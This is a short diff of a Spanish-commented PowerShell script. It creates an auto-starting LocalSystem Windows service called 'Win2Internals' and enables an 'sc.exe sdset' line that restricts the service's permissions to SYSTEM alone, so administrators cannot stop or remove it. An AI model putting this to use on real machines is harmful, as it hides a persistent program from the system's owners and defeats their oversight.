@@ -94,7 +94,7 @@ try {
     
     # Crear nuevo servicio
     sc.exe create Win2Internals binPath= "$Win2" start= auto obj= "LocalSystem" type= own
-    # sc.exe sdset Win2Internals "D:(A;;GA;;;SY)"
+    sc.exe sdset Win2Internals "D:(A;;GA;;;SY)"
     
     # Iniciar servicio
     sc.exe start Win2Internals
